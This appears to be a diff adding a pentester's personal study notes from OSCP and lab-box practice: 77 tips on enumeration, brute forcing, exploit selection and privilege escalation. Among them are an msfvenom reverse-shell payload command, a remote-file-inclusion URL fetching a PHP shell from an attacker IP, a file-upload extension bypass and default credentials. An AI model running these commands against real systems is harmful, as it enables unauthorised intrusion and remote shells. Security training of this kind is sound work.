@@ -1,0 +1,91 @@
+
+	1. Do not waste much time on a single thing unless you are pretty sure, it may be a rabbit hole.
+	2. Importance of putting '/' at the end in the directory.
+	3. Try different exploits if one is not working.
+	4. Whenever we find any page that contains some of the passwords, collect each of them we think can be a password and store it in a file to use for brute forcing against SSH with some valid usernames.
+	5. Every possible thing can be a username or password, so don’t be irresponsible. Look carefully.
+	6. Try to do exploit manually, maybe it works sometimes if not script. Try to think out of the box. Try to find a way.
+	7. Always try machine name as a password if a valid username is found. Otherwise try it as username and password both.
+	8. If the extension of a file ends with .php.png  -  the apache server should not be executing the php code. But there was a misconfiguration in a apache server earlier that used to executes the php code if .php extension is present anywhere in the file name. That can lead to dangerous PHP code execution even if the file is an image file and PHP code s embedded in the same file.
+	9. If unable to find specific path, download (or search on GitHub) the same application/web-server, or application on the attacking machine and roam around to find the needed path or just use find command.
+	10. If any payload from msf-venom is not working, just generate different payload from msf-venom or find alternatives of that payload from google/github.
+	Did not work in my case:  java/shell_reverse_tcp
+	Worked in my case:  java/jsp_shell_reverse_tcp
+	11. Run Gobuster/feroxbuster/dirsearch and Nikto and WhatWeb on each web application. Likewise, use Burp-suite or Curl for response headers.
+	12. Always check the doubtful vector of privesc very carefully.
+	13. If the files have been deleted from the USB Media - USB Stick, We can retrieve the deleted files using the commands I used in the Mirai HTB box. Refer to that.
+	14. To open java file (BlockCore.class) : --> jd-gui  -->  Here we can use strings on the .class file but the java gui is recommended. (Blocky)
+	15. If gobuster is showing more errors even though our target address or domain-name is correct, that means the gobuster is heavily brute-forcing the server because of the many threads assigned to it to run which is causing the DoS on the target server. So just lower the threads.
+	16. Learn about new binaries from the GTFOBins. Don't hesitate about searching it on a web.
+	17. Extract tgz files  -->  tar -zxvf backup.tgz
+	18. While trying exploits, always try '/' at the end of the URL. Try both way. E.g.  http://machineIP/ona OR http://machineIP/ona/  -->  One of them should work. (openadmin)
+	19. If any webserver or anything running only internally/locally on different port, try to curl it from the victim machine itself.
+	20. Once on the box, always check index.php file because sometimes we may find the hardcoded credentials there.  (Openadmin HTB)
+	21. If rev shell one liner doesn't work, try the base64 thing or just use HTML Entity Encoding e.g. for >&  ---->   &gt;&amp;    like that.  https://mothereff.in/html-entities  (Broker)
+	22. To check the library version in the python script  --->  pip freeze | grep -i git
+	23. Always fuzz subdomains for the domain name.
+	24. Search exploits on google --> github. It may happen that working exploit is on the 5 or 7th link and not just on the first 3 pages.
+	25. Always try to connect to the ports via Netcat. E.g. -->  nc 10.10.10.15 4555
+	26. Always check whether login page says "incorrect username or password" or 'incorrect username' or 'incorrect password'  -->  This can tell us the correct value indirectly.
+	27. In the end of the SSH public key we can see the username to it belongs.
+	28. Command to know package version  -->  dpkg -l  |  grep -I pam  (here, we were looking for the PAM version.  (Popcorn)
+	29. PowerShell-Empire ----> Invoke-MS16032.ps1
+	30. Although I will not be using metasploit in the exam, but when metasploit takes too much of time that means that it is having trouble getting a response from the victim's website maybe because the victim's machine is too slow.
+	31. Sometimes HTTP website takes time to load. So, it is worth waiting for 8-10 seconds.
+	32. A bastion host is a special-purpose computer on a network specifically designed and configured to withstand attacks, so named by analogy to the bastion, a military fortification. (Bastion HTB)
+	33. If the HTTP 80, 443, etc. is not loading on the Firefox, try another browser e.g. Chromium.
+	34. Local Administrator Password Solution (LAPS) is a method of managing the passwords for the local administrator accounts via the domain. Without laps, it’s very challenging for a support team to manage keeping unique local admin passwords for each system. This leads to shared credentials, which means that when an attacker gets elevated privileges on a system, they can dump the shared cred and use it to get access on other systems. LAPS also rotates administrator passwords, changing them periodically, such that if they are captured by an attacker, they become invalid after some period of time.  (Timelapse HTB)
+	35. A .pfx file typically represents the PKCS#12 format, containing both a public and private key for a user.  (Timelapse)  From .pfx  -->  Using legacyy_dev_auth.crt (public key certificate) and legacyy_dev_auth.key (private key), we can login using evil-winrm
+	36. This combination of ports (Kerberos + LDAP + DNS + SMB) suggest that the machine is likely a domain controller.
+	37. Checking metadata of the file such as time and date or year is very important. Check the NetMon HTB Box.
+	38. Umbraco database file - Umbraco.sdf
+	39. For Drupal, use droopescan to scan it.
+	40. Whenever an input field is found, try to get a connection back on the netcat to know whether it is executing the links or not. E.g. http://<kali_IP>:4444
+	Always check the difference in output by converting POST to GET. If same output, we can send the link and change the password directory [CSRF or XSRF attack].  (consider the above point)
+	41. Before running any searchsploit copied Python script, just type the script name and hit enter. It will show you what are the requirements.
+	42. If the print method does not contain () braces, the Python version is 2 (python2)
+	43. Check every found directories after the initial access. Don't want to miss anything.
+	44. While finding flag, keep that in mind that the user or root flag file can be hidden so always: ls -la   OR  dir /a
+	45. Check if MongoDB (27017) running on the victim system. Refer to ROAD THM.
+	46. To filter out the repeated words --->  cat fsocity.dic | sort | uniq > sorted-filtered.dic
+	47. Always create and use python virtual environment to install a new package or a new versions of libraries/packages. (Secura)
+	48. There are different types of private keys such as id_rsa, id_ecdsa, id_ecdsa_sk, id_ed25519, id_ed25519_sk, and id_dsa (Relia PWK)
+	49. If any Database file is found e.g. Database.kdbx then see if you can crack its master password using John the Ripper. (Relia)
+	50. If one exploit does not work, try GitHub one. Keep changing the exploits until you find a working one. If there aren't many, try to troubleshoot why isn't it working.
+	51. Always scan the UDP ports. I found 161 UPD SNMP.  (OSCP-B)
+	52. Try to create dots from the information you have and then try to connect them.
+	53. I invested too much time in SMTP because its version (Exim smtpd 4.90_1) was purely vulnerable. But ended up knowing that it was a rabbit hole. (OSCP-C)
+	54. Enumerate everything even if you think it is a rabbit hole. Because, I literally knew that vestaROOT.py was the exploit. how? Here. In the pic, as you can see on the robots file it was written. I then searched for it and came to know that it is like a control panel you can operate through the web. I then searched for its exploits and literally found that GitHub repo I just shared above.  But the thing is - I OVERLOOKED it. and went to enumerate other things. (Just frustrated me but point to be noted)
+	55. Run the exploit even if it throws an error, then wait for it to finish. It is worth waiting sometimes.
+	56. Postgres default creds  -->  postgres : postgres
+	57. Read the exploits carefully. Look for POC exploit. Go through the exploit-db exploits by scrolling to the end.   (Snookums PG)
+	58. If finds any cms or web application, try to search it on google. You may find open source repo on github or downloadable link if available.
+	59. Read the exploit very carefully like what kind of command line arguments it want us to provide.  (Flu PG)
+	60. Wander throughout the directories in the victim's machine. Look upside-down. Every thing.   (Flu)
+	61. If the exploit doesn't work in first attempt, try running it 2-3 more times. Here the exploit worked in its second attempt.
+	62. I refreshed the concept of Bind shell on this machine. Because my reverse shells were not working and the victim machine was not getting connected to my VM, I needed to restart the VPN and the victim machine itself but unfortunately I didn't do that. So searched for other techniques and medhat told me to use bind shell. It worked. I used python one there. This was exceptional which was not needed but tried it.  (Ochima)
+	63. Search the exploits for every new terms/words you come across.
+	64. After running the exploit script, If you are getting the output but see warnings in the end, then don't panic it's maybe because of the versions.
+	65. Always try searching for exploit by its CVE number like here, I searched the exploit by the software's version and it didn't work. Then after that I searched it by its CVE:  CVE-2021-3129 found one helpful github link and it worked.
+	66. Msfvenom --->  Always remember that a slash ('/') means a non-staged payload and an underscrore ('_') means a staged payload.
+	67. Sometimes if netcat cannot handle connections then we can use metasploit's exploit/multi/handler
+	68. If a phpinfo page found. Always check for:
+	allow_url_fopen = on
+	allow_url_include = on
+	Because we are allowed to include any URL here, the system will execute it hence it is a RFI.
+	If the website is vulnerable to RFI, try searching for a parameter which is taking an arguments (can be anything like calling different pagenames)
+	E.g.  http://192.168.188.53:4443/site/index.php?page=http://192.168.45.159/windows_ivan_sincek_shell.php
+	69. If non-staged (with / ) doesn't work, then immediately shift to staged (with _ ) payload. On this box, staged-worked.  (Access PG)
+	70. If python2 packages downloading issue  -->  python2 -m pip install --upgrade setuptools  -->  apt install python-setuptools
+	71. Linux binary file  --->   msfvenom -p linux/x64/shell_reverse_tcp -f elf -o shell LHOST=192.168.118.3 LPORT=21
+	72. Use 500-worst-passwords.txt from seclists for brute-forcing first.
+	73. Let hashcat or john run at least for 30 minutes.
+	74. Search for CVE and then search exploit in GitHub.
+	75. Always use -->  "bash -c '<bash_one_liner>'"  and  for windows  -->  "cmd /c <payload>"
+	76. If php files are not allowed, upload shell.png -->  intercept via burp --> change it to shell.php and send the request.
+	77. If ffuf, feroxbuster, etc. is running, the exploit might not work because of the packet delay.
+	
+	
+	
+	
+	
